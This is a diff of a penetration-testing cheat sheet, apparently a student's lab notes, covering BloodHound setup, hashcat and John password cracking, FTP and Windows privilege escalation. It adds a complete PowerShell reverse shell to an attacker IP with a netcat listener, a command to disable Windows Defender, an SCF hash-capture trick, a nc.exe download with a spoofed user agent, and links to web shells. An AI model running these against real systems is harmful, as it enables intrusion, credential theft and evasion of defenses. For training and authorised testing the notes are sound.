@@ -22,6 +22,7 @@
 - [Dig](#dig)
 - [DNScat2](#dnscat2)
 - [Dnsenum](#dnsenum)
+- [Debugging Binaries](#debugging-binaries)
 - [DomainPasswordSpray](#domainpasswordspray)
 - [Enum4linux-ng](#enum4linux-ng)
 - [Evil-WinRM](#evil-winrm)
@@ -108,12 +109,63 @@ Switch Java to version 11 if there are issues:
 update-alternatives --config java
 ```
 
-Start services:
+In Arch Linux:
 ```bash
-neo4j console
+archlinux-java status
+```
+
+```bash
+sudo archlinux-java set java-11-openjdk 
+```
+
+Remember which version of java you were using before so you can go back to it.
+
+Start the server of neo4j:
+```bash
+sudo systemctl start neo4j
+```
+
+Login in the localhost:7474, use default credentials, neo4j:neo4j, change the password.
+
+```bash
 bloodhound &>/dev/null &
 disown
 ```
+
+If you have problems with the password, you can reset the password.
+
+delete the file:
+```bash
+sudo trash-put /var/lib/neo4j/data/dbms/auth.ini
+```
+
+If you have problem when start the service, you can check and change the permissions:
+
+```bash
+sudo chown -R neo4j:neo4j /var/log/neo4j
+sudo chown -R neo4j:neo4j /var/lib/neo4j
+sudo chown -R neo4j:neo4j /var/run/neo4j 2>/dev/null
+```
+
+Remember that when you change the password for the first time, this need to have more than 8 characters:
+org.neo4j.commandline.admin.security.exception.InvalidPasswordException: A password must be at least 8 characters.
+
+You can stop the neo4j services and delete the database.
+
+```bash
+sudo rm -rf /var/lib/neo4j/data/databases/system
+```
+
+```bash
+sudo rm -rf /var/lib/neo4j/data/transactions/system 
+```
+
+And the auth file.
+```bash
+sudo rm -f /var/lib/neo4j/data/dbms/auth /var/lib/neo4j/data/dbms/auth.ini
+```
+
+Start the service.
 
 Data collection with SharpHound (from Windows):
 ```powershell
@@ -156,6 +208,8 @@ Pre-built queries (Analysis tab):
 - `Find Computers with Unsupported Operating Systems` — outdated/legacy hosts
 - `Find Computers where Domain Users are Local Admin` — hosts where all users have local admin
 - `Database Info` tab → search for a node (e.g. `Domain Users`) → explore `Node Info`
+
+If you click in the left top menu > Analysis > you can find pre-built queries.
 
 Custom queries via `Raw Query` box. Cheatsheet: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
 
@@ -415,7 +469,6 @@ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 ```bash
 evil-winrm -u 'user' -p 'password'
-evil-winrm -i 192.168.1.100 -u Administrator -p 'Password!'
 ```
 
 With Docker:
@@ -511,9 +564,78 @@ IPMI hashes (mode 7300):
 hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
 ```
 
-Generate mutated wordlist with custom rules:
+### Writing custom wordlists and rules
+
+Many employees choose passwords that include the company's name. References to pets, friends, sports, hobbies, and other aspects of daily life.
+
+Commonly, users use the following password to fit the most common policies:
+
+| Description                           | Password Syntax  |
+| :------------------------------------ | :--------------- |
+| First letter is uppercase             | `Password`       |
+| Adding numbers                        | `Password123`    |
+| Adding year                           | `Password2022`   |
+| Adding month                          | `Password02`     |
+| Last character is an exclamation mark | `Password2022!`  |
+| Adding special characters             | `Password@2022!` |
+
+To create custom wordlists you can use rules:
+
+| Función | Descripción                                      |
+| :------ | :----------------------------------------------- |
+| .       | Do nothing                                       |
+| l       | Lowercase all letters                            |
+| u       | Uppercase all letters                            |
+| c       | Capitalize the first letter and lowercase others |
+| sXY     | Replace all instances of X with Y                |
+| $!      | Add the exclamation character at the end         |
+
+Each rule is written on a new line
+
+```bash
+cat custom.rule
+
+:
+c
+so0
+c so0
+sa@
+c sa@
+c sa@ so0
+$!
+$! c
+$! so0
+$! sa@
+$! c so0
+$! c sa@
+$! so0 sa@
+$! c so0 sa@
+```
+
+We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
+```
+
+Example of the output:
+```bash
+cat mut_password.list
+
+password
+Password
+passw0rd
+Passw0rd
+p@ssword
+P@ssword
+P@ssw0rd
+password!
+Password!
+passw0rd!
+p@ssword!
+Passw0rd!
+P@ssword!
+p@ssw0rd!
+P@ssw0rd!
 ```
 
 Rules location: `/usr/share/hashcat/rules`
@@ -579,7 +701,14 @@ ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.Web
 
 ## John The Ripper
 
-Single crack mode (by username):
+Single crack mode is a rule-based cracking useful when targeting Linux credentials. It generates password candidates based on the victim's username, home directory, geocos values.
+
+Example with the passwd file with the following content:
+```bash
+r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bas
+```
+
+The tool will use `r0lf`, `Rolf Sebastian` and `/home/r0lf` to generate candidate passwords
 ```bash
 john --single passwd
 ```
@@ -590,23 +719,42 @@ john --wordlist=<wordlist> <hash_file>
 john --wordlist=rockyou.txt hashes
 ```
 
+Identify hash format:
+```bash
+hashid -j 193069ceb0461e1d40d216e32c79c704
+```
+
+Also you can see:
+- https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
+- https://openwall.info/wiki/john/sample-hashes
+
 Specify format:
 ```bash
 john --format=zip [...] <hash_file>
 ```
 
-File-to-John converters:
+### Cracking files
 
-| Tool | Description |
-|------|-------------|
-| `pdf2john` | Password-protected PDFs |
-| `ssh2john` | SSH private keys |
-| `rar2john` | RAR archives |
-| `keepass2john` | KeePass databases |
-| `zip2john` | ZIP archives |
-| `office2john` | MS Office documents |
-| `pfx2john` | PKCS#12 files |
-| `hccap2john` | WPA/WPA2 captures |
+You can use tools such as `pdf2john` to convert a file with password to a john format
+
+| Herramienta             | Descripción                                   |
+| :---------------------- | :-------------------------------------------- |
+| `pdf2john`              | Converts PDF documents for John               |
+| `ssh2john`              | Converts SSH private keys for John            |
+| `mscash2john`           | Converts MS Cash hashes for John              |
+| `keychain2john`         | Converts OS X keychain files for John         |
+| `rar2john`              | Converts RAR archives for John                |
+| `pfx2john`              | Converts PKCS#12 files for John               |
+| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
+| `keepass2john`          | Converts KeePass databases for John           |
+| `vncpcap2john`          | Converts VNC PCAP files for John              |
+| `putty2john`            | Converts PuTTY private keys for John          |
+| `zip2john`              | Converts ZIP archives for John                |
+| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
+| `office2john`           | Converts MS Office documents for John         |
+| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
+
+You can find more if you use **locate \*2john\***
 
 Find converters:
 ```bash
@@ -794,9 +942,9 @@ use auxiliary/scanner/mssql/mssql_ping
 
 ### Useful Plugins
 
-- **Railgun**: call Windows API functions directly from Meterpreter
-- **Darkoperator's** collection: https://github.com/darkoperator/Metasploit-Plugins
-- **WADComs** (interactive cheatsheet for AD/Windows): https://wadcoms.github.io/
+- Railgun
+- Darkoperator's
+- [WADComs project](https://wadcoms.github.io/). Is a list of offensive security tools to be used against Windows/AD environment.
 
 ---
 
@@ -1006,8 +1154,7 @@ ncat -nv --source-port 53 10.129.2.28 50000
 sudo nmap -n -sV -p50000 10.129.50.64 -Pn --source-port 53 -f -T1 -D RND:5
 ```
 
-Scripts location: `/usr/share/nmap/scripts/`
-Categories: auth, brute, default, discovery, dos, exploit, fuzzer, intrusive, malware, safe, version, vuln
+You can find the script in `/usr/share/nmap/scripts/`, in addition, you can create your own .nse scripts.
 
 ---
 
@@ -1300,6 +1447,43 @@ stty size                         # get your terminal dimensions
 stty rows 67 columns 318          # apply on remote shell
 ```
 
+### Payload in Windows
+
+```PowerShell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+If you're in a powershell you don't need to use `powershell -nop -c`.
+
+In the server (attack machine)
+```bash
+sudo nc -lvnp 443
+```
+
+Disable Windows Defender Antivirus (AV)
+```PowerShell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### Useful resources
+
+- Mythic C2 Framework: [Source](https://github.com/its-a-feature/Mythic)
+- Nishang: [Source](https://github.com/samratashok/nishang). Framework collection of Offensive PowerShell implants and scripts.
+- Darkarmour: [Source](https://github.com/bats3c/darkarmour). Is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
+
+web shells:
+
+- laudanum repository of web shell: https://github.com/jbarcia/Web-Shells/tree/master/laudanum
+- aspx Nishang: Offensive powershell for red team. https://github.com/samratashok/nishang
+  - Antak-WebShell: Powerfull powershell webshell
+- php web shell wwwolf: https://github.com/WhiteWinterWolf/wwwolf-php-webshell.
+
+### Useful tips
+
+CMD does not keep a record of the commands used during the session, however, powershell does.
+
+Exuection Policy and User account Control (UAC) can inihibit your ability to execute commands and scripts. These affect to powershell but not to cmd.
+
 ---
 
 ## Smbclient
@@ -1590,18 +1774,21 @@ Invoke-WebRequest https://url -UseBasicParsing | IEX
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}   # bypass SSL
 ```
 
-### Changing User Agent (Evade Detection)
+### Changing User Agent
 
-Some defenders block default PowerShell User-Agents. Spoof with a browser UA:
+If administrators have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter.
+
+Listing User-Agents:
 ```powershell
-$h = New-Object System.Net.WebClient
-$h.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36")
-$h.DownloadString("http://10.10.14.17/file.ps1")
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 ```
 
-Invoke-WebRequest with custom UA:
 ```powershell
-Invoke-WebRequest http://10.10.14.17/file.ps1 -UseBasicParsing -UserAgent "Mozilla/5.0 ..."
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+```
+
+```powershell
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
 ### Base64 (bypass firewall)
@@ -2095,6 +2282,132 @@ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmc
 
 ---
 
+## Debugging Binaries
+
+You can use file command to obtain a little more of information
+
+```bash
+file binary
+```
+
+### strings
+
+You can use `strings` command to obtain 
+
+### Executing the file
+
+If you're in linux you can try:
+```bash
+wine binary.exe
+```
+
+### ltrace
+
+Intercept the libraries executed by the binary
+
+```bash
+ltrace binary
+```
+
+### strace
+
+Trace system call and signals.
+
+```bash
+strace binary
+```
+
+### objdump
+
+Allow disassembly the binary
+
+```bash
+objdump -d binary
+```
+
+### gdb
+
+### Ghidra
+
+#### Arch bug
+
+Bug in arch system, open ghidra, but user license dissapear, you can accept from terminal
+
+```
+export JAVA_TOOL_OPTIONS="-DUSER_AGREEMENT=ACCEPT"
+```
+
+https://github.com/NationalSecurityAgency/ghidra/blob/master/DevGuide.md
+
+You can add to the .zshrc
+
+```bash
+echo 'export JAVA_TOOL_OPTIONS="-DUSER_AGREEMENT=ACCEPT"' >> ~/.zshrc
+```
+
+If you open in a blank desktop it works.
+
+#### Installing jdk debian
+
+```
+apt-cache search java11
+sudo apt install openjdk-11-jdk
+```
+
+#### Creating a project
+
+Create a project
+
+Analyse, the default option are normally good.
+
+#### Configurations
+
+In the project view. Edit > Theme > Switch > Flat Dark Theme
+
+### What can you search?
+
+#### Imports
+
+You can search Imports from Symbol Tree → Imports in the left side.
+
+- `msfcoree.dll` is the boot core of .NET.
+- `WININET.DLL / WINHTTP.DLL` allow download HTTP/HTTPS
+
+#### Strings
+
+From Windows > Defined Strings
+
+Or
+
+In the options panel at the top, you can see **Search -> For Strings**, you can put the default options.
+
+#### Entry point
+
+main function
+
+In the tree view on the left side, you can click on function, and search main.
+
+### Decompile function
+
+Double click in a function and in decompiled windows you will see the function.
+
+### For .NET or C# binaries
+
+#### Avaloniailspy / ILSpy
+
+Ghidra no support all the programming language, there are other tools 
+This decompiler works well with .NET Apps / C# code.
+
+You need to install .NET and it doesn't exist for arch linux.
+
+#### dnspy
+
+```bash
+yay -S dnspyex-wine-bin
+```
+
+---
+
 ## DomainPasswordSpray
 
 ```powershell
@@ -2375,7 +2688,35 @@ If SSH returns `1:7.3p1-1ubuntu0.1`, search Google for `"1:7.3p1-1ubuntu0.1 code
 2. If anonymous is allowed, list and download everything: `wget -m --no-passive ftp://anonymous:anonymous@<IP>`
 3. Check TLS: `openssl s_client -connect <IP>:21 -starttls ftp` — certificate may reveal hostname and email
 
-FTP commands: `ls -la` (hidden), `ls -R` (recursive), `get file`, `prompt; mget *`
+Anonymous login:
+```bash
+ftp 10.129.42.253
+# name anonymous
+# password anonymous
+```
+
+Using passive connection:
+```bash
+ftp -p 10.129.42.253
+```
+With **-p** parameter you are using the **passive connection**. With passive connection is straightforward avoid firewall in the client (our attacker machine)
+
+To connect a host with another port:
+```bash
+ftp 192.168.1.1 2121
+```
+
+FTP commands:
+- `cd` -> Move through directories.
+- `ls` -> List content
+- `ls -la` -> To see hidden files.
+- `ls -R` -> Recursive listing
+- `get file.txt` -> Obtain a file
+- `prompt` -> Allow to retrieve multiple files
+- `mget *` -> Obtain multiple files
+- `exit/bye` -> Disconnect from FTP server.
+- `status` -> Show an overview of the server's settings
+- `put testupload.txt` -> Upload a file
 
 ### SSH (port 22)
 
@@ -2799,20 +3140,15 @@ copy golden.kirbi \\<attacker_ip>\smbFolder\golden.kirbi
 
 ## DCSync
 
-Get NTLM hashes of all domain users using the AD replication protocol.
-
-```bash
-# With impacket (requires replication permissions or be domain admin)
-impacket-secretsdump domain.local/Administrator:'password'@<DC_IP>
-```
+Obtain NTLM hashes of users:
 
 ---
 
 ## SCF Files (SMB Hash Capture)
 
-If you have write permissions on an SMB share, you can create an `.scf` file that makes Windows load an icon from a UNC path (your machine), capturing the NTLM hash of anyone who opens the folder.
+If you have some user that can write in SMB you can create a scf file that allow you to obtain the hash NTLM.
 
-Content of `@file.scf` (the `@` makes it appear at the top of the directory):
+Content of **file.scf**. The idea of this type of files is poisoning the icon of the file.
 ```
 [SHELL]
 Command=2
@@ -2821,25 +3157,26 @@ IconFile=\\<attacker_ip>\smbFolder\malicious.ico
 Command=ToggleDesktop
 ```
 
-```bash
-# Upload the file
-smbclient //<IP>/share -U user -c 'put file.scf'
+With smbclient you can upload the file with `put` command
 
-# Start Samba server on attacker to capture the hash
+Start a Samba server:
+```
 impacket-smbserver smbFolder $(pwd) -smb2support
 ```
+
+If any person open the folder where is the file, only with open the folder you obtain the hash NTLM
 
 ---
 
 ## Abusing GPP Passwords
 
-If you have access to the Domain Controller's `SYSVOL` resource, look for the `Groups.xml` file inside `Policies/`.
+If you are in a domain controlled and you're allowed to see the content of the SYSVOL resource or a similar structure you can found credentials inside. The path normally is this:
 
 ```bash
-smbmap -H 10.10.10.10 -r Policies/{31B...-5661...}/MACHINE/Preferences/Groups/Groups.xml
+smbmap -H 10.10.10.10 -r Policies/{31B...-5661...-725}/MACHINE/Preferences/Groups/Groups.xml
 ```
 
-The `cpassword` field contains the password encrypted with AES-32, but Microsoft published the key — it can be decrypted directly:
+To crack the hash you can use `gpp-decrypt` tool (Microsoft shared the AES-key).
 
 ```bash
 gpp-decrypt <cpassword_value>
@@ -2891,24 +3228,42 @@ The `--local-auth` flag attempts login once per machine, avoiding lockouts.
 
 ## Windows Privilege Escalation
 
-### Checklist
+Check if autologin is enable for some user, you can see the user in field DefaultUserName and password in field DefaultPassword with:
 
-1. **Autologin:** `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` — look for `DefaultUserName` and `DefaultPassword`
-2. **Scheduled Tasks:** `schtasks /query /fo LIST /v` — tasks with editable paths
-3. **Vulnerable services:** service binaries with write permissions for the current user
-4. **Exposed credentials:** configuration files, logs, PowerShell history (`PSReadLine`)
-5. **Vulnerable software:** `C:\Program Files` — look for versions with known exploits
-6. **Kernel exploits:** compare Windows version with known CVEs
-7. **Password reuse:** use found credentials on other accounts/services
-8. **AlwaysInstallElevated:** `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
-9. **SeImpersonatePrivilege / SeAssignPrimaryToken:** Juicy Potato / PrintSpoofer
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
 
-### Enumeration Scripts
+### Scheduled Tasks
 
-- **WinPEAS**: full enumeration
-- **Seatbelt**: security check
-- **JAWS**: PowerShell script
-- **PowerUp.ps1**: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+There are two main approach to take advantages of scheduled tasks:
+1. Add new scheduled task jobs
+2. Trick them to execute a malicious software
+
+### Search exposed credentials
+
+This is very common in configuration files, log files and user history files (PSReadLine)
+
+### Password reuse
+
+It's possible that one password found it's used in another user, program, service...
+
+### Vulnerable software
+
+In Windows you can look in `C:\Program Files` to find software.
+
+### Kernel exploits
+
+### Abusing `SeImpersonate` privileges
+
+Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
+
+### Enumeration scripts
+
+- Seatbelt
+- JAWS
+- WinPeas
+- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
 
 ### RBCD Attack
 
@@ -3096,8 +3451,8 @@ ssh root@10.10.10.10 -i key
 
 1. Run SharpHound on Windows: `Invoke-BloodHound -CollectionMethod All`
 2. Download the ZIP: `download "C:/Windows/Temp/test/*.zip" bloodhound.zip`
-3. Start neo4j: `neo4j console`
-4. Start BloodHound: `bloodhound &`
+3. Start neo4j: `sudo systemctl start neo4j`
+4. Start BloodHound: `bloodhound &>/dev/null & disown`
 5. Upload the ZIP → Analysis → look for paths to Domain Admin
 
 ### Identify Vulnerabilities from SYSTEM
@@ -3311,7 +3666,6 @@ Kerbrute finds valid accounts → continue with RBCD or Shadow Credentials attac
 - `admin:admin`
 - `root:root`
 - `user:password`
-- Always search for product-specific credentials on Google
 
 ### Protocol Command Tables
 
@@ -3374,7 +3728,6 @@ If `root_squash` is not configured, it's possible to create a SUID binary on the
 2. Dump hashes with Metasploit: `use auxiliary/scanner/ipmi/ipmi_dumphashes`
 3. Crack hash: `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`
 4. Access BMC web console with obtained credentials
-5. BMC credentials are often reused on other systems
 
 ---
 
@@ -3570,7 +3923,6 @@ kill <n>        # kill job
 getuid                          # current user
 ps                              # processes
 steal_token <PID>              # steal process token
-migrate <PID>                  # migrate process
 hashdump                       # dump SAM hashes
 lsa_dump_sam                   # SAM dump
 lsa_dump_secrets               # LSA secrets
